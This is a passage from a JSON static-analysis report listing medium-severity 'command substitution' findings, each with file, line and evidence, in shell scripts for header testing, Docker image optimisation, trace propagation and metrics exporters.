        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "TEMP_DIR=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "printf \"%s\\n\" \"${URLS[@]}\" | xargs -P \"$PARALLEL_JOBS\" -I {} bash -c \"test_url '{}' '$TEMP_DIR/\\$(echo {} | md5sum | cut -d' ' -f1)'\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 444,
        "issue": "Command substitution in shell",
        "evidence": "first_file=$(find \"$TEMP_DIR\" -type f | head -n1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS] IMAGE_NAME",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 63,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 66,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") -b myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 69,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json myapp:latest",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 152,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 165,
        "issue": "Command substitution in shell",
        "evidence": "total_layers=$(docker history \"$image\" --no-trunc --format \"{{.Size}}\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 181,
        "issue": "Command substitution in shell",
        "evidence": "base_image=$(docker image inspect \"$image\" --format='{{.Config.Image}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "user=$(docker image inspect \"$image\" --format='{{.Config.User}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "healthcheck=$(docker image inspect \"$image\" --format='{{.Config.Healthcheck}}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 202,
        "issue": "Command substitution in shell",
        "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "content=$(cat \"$original_dockerfile\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "$(echo \"$issues\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "$(echo \"$recommendations\" | sed 's/^/    \"/; s/$/\"/' | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 355,
        "issue": "Command substitution in shell",
        "evidence": "size_bytes=$(get_image_size \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 357,
        "issue": "Command substitution in shell",
        "evidence": "size_human=$(human_size \"$size_bytes\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 360,
        "issue": "Command substitution in shell",
        "evidence": "layers=$(docker history \"$image\" --quiet | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 363,
        "issue": "Command substitution in shell",
        "evidence": "issues=$(check_optimizations \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 366,
        "issue": "Command substitution in shell",
        "evidence": "recommendations=$(generate_recommendations \"$image\" \"$size_bytes\" \"$size_human\" \"$issues\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 397,
        "issue": "Command substitution in shell",
        "evidence": "original_size=$(get_image_size \"$image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 399,
        "issue": "Command substitution in shell",
        "evidence": "optimized_size=$(get_image_size \"$optimized_image\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 402,
        "issue": "Command substitution in shell",
        "evidence": "reduction=$(awk \"BEGIN {printf \\\"%.1f\\\", 100 - ($optimized_size * 100.0 / $original_size)}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "print_info \"Original:  $(human_size \"$original_size\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/optimize_image.sh",
        "line_number": 407,
        "issue": "Command substitution in shell",
        "evidence": "print_info \"Optimized: $(human_size \"$optimized_size\")\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 37,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url <service-url> [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000/api/users",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 53,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 --format b3",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 56,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 \\\\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 60,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8000 --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 121,
        "issue": "Command substitution in shell",
        "evidence": "printf '%032x' $((RANDOM * RANDOM * RANDOM * RANDOM))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 126,
        "issue": "Command substitution in shell",
        "evidence": "printf '%016x' $((RANDOM * RANDOM))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 162,
        "issue": "Command substitution in shell",
        "evidence": "local timestamp=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 163,
        "issue": "Command substitution in shell",
        "evidence": "local random=$(printf '%024x' $((RANDOM * RANDOM * RANDOM)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "local trace_id=$(generate_trace_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 174,
        "issue": "Command substitution in shell",
        "evidence": "local span_id=$(generate_span_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 181,
        "issue": "Command substitution in shell",
        "evidence": "local traceparent=$(generate_w3c_traceparent \"$trace_id\" \"$span_id\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "local xray_trace_id=\"1-$(date +%s)-${trace_id:0:24}\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 211,
        "issue": "Command substitution in shell",
        "evidence": "response=$(eval \"$curl_cmd '$url'\" 2>&1) || {",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "response_headers=$(cat \"/tmp/test_propagation_headers_$$.txt\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 236,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"traceparent:\" | sed 's/.*00-\\([^-]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 242,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-B3-TraceId:\" | awk '{print $2}' | tr -d '\\r')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"b3:\" | sed 's/.*b3: \\([^-]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 254,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"uber-trace-id:\" | sed 's/.*uber-trace-id: \\([^:]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "received_trace_id=$(echo \"$response_headers\" | grep -i \"X-Amzn-Trace-Id:\" | sed 's/.*Root=\\([^;]*\\).*/\\1/')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 281,
        "issue": "Command substitution in shell",
        "evidence": "local trace_id=$(generate_trace_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "local span_id=$(generate_span_id)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "result1=$(test_propagation \"$url1\" \"$format\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 288,
        "issue": "Command substitution in shell",
        "evidence": "local propagated1=$(echo \"$result1\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "result2=$(test_propagation \"$url2\" \"$format\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 299,
        "issue": "Command substitution in shell",
        "evidence": "local propagated2=$(echo \"$result2\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 300,
        "issue": "Command substitution in shell",
        "evidence": "local trace_preserved2=$(echo \"$result2\" | cut -d'|' -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 301,
        "issue": "Command substitution in shell",
        "evidence": "local received_trace_id2=$(echo \"$result2\" | cut -d'|' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 311,
        "issue": "Command substitution in shell",
        "evidence": "local propagated=$(echo \"$result\" | cut -d'|' -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "local trace_preserved=$(echo \"$result\" | cut -d'|' -f2)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 313,
        "issue": "Command substitution in shell",
        "evidence": "local sent_trace_id=$(echo \"$result\" | cut -d'|' -f3)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "local received_trace_id=$(echo \"$result\" | cut -d'|' -f4)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 325,
        "issue": "Command substitution in shell",
        "evidence": "\"passed\": $([ \"$propagated\" == \"true\" ] && [ \"$trace_preserved\" == \"true\" ] && echo \"true\" || echo \"false\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 364,
        "issue": "Command substitution in shell",
        "evidence": "result=$(test_propagation \"$URL\" \"$FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/scripts/test_propagation.sh",
        "line_number": 368,
        "issue": "Command substitution in shell",
        "evidence": "result=$(test_multihop \"$URL\" \"$DOWNSTREAM_URL\" \"$FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 149,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 155,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 182,
        "issue": "Command substitution in shell",
        "evidence": "local total_lines=$(wc -l < \"$metrics_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_METRICS=$(echo \"$metric_names\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 302,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_HELP=$(grep -c '^# HELP ' \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 303,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TYPE=$(grep -c '^# TYPE ' \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 312,
        "issue": "Command substitution in shell",
        "evidence": "local metrics_count=$(echo \"$metric_names\" | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "local missing=$((metrics_count - TOTAL_HELP))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 323,
        "issue": "Command substitution in shell",
        "evidence": "local missing=$((metrics_count - TOTAL_TYPE))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 339,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_SAMPLES=$(grep -v '^#' \"$metrics_file\" | grep -v '^$' | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "local avg_cardinality=$((TOTAL_SAMPLES / TOTAL_METRICS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 378,
        "issue": "Command substitution in shell",
        "evidence": "local types=$(grep '^# TYPE ' \"$metrics_file\" | awk '{print $4}' | sort | uniq -c)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 405,
        "issue": "Command substitution in shell",
        "evidence": "local issues_json=$(printf '%s\\n' \"${ISSUES[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/prometheus-monitoring/resources/scripts/test_exporter.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "local warnings_json=$(printf '%s\\n' \"${WARNINGS[@]}\" | jq -R -s -c 'split(\"\\n\")[:-1]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 27,
        "issue": "Command substitution in shell",
        "evidence": "HELP_TEXT=\"Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 41,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 44,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --file exporters.txt",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 47,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 50,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --url http://localhost:8080/metrics --verbose",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 172,
        "issue": "Command substitution in shell",
        "evidence": "content_type=$(curl -s -I -m \"$TIMEOUT\" \"$url\" 2>/dev/null | grep -i \"content-type\" | cut -d: -f2 | tr -d '[:space:]')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "metrics_with_help=$(grep -c \"^# HELP \" \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 258,
        "issue": "Command substitution in shell",
        "evidence": "metrics_with_type=$(grep -c \"^# TYPE \" \"$metrics_file\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "local help_percentage=$((metrics_with_help * 100 / (total_metrics + 1)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "local type_percentage=$((metrics_with_type * 100 / (total_metrics + 1)))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 324,
        "issue": "Command substitution in shell",
        "evidence": "error_percentage=$((bad_names * 100 / total_metrics))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 389,
        "issue": "Command substitution in shell",
        "evidence": "metric_count=$(grep -v \"^#\" \"$metrics_file\" | grep -c \"^[a-zA-Z]\" || true)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 421,
        "issue": "Command substitution in shell",
        "evidence": "metrics_file=$(mktemp)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/test_exporter.sh",
        "line_number": 489,
        "issue": "Command substitution in shell",
        "evidence": "echo \"    \\\"passed\\\": $((${#urls[@]} - failed)),\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/test-driven-development/resources/scripts/generate_test_template.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") LANGUAGE NAME [OPTIONS]",
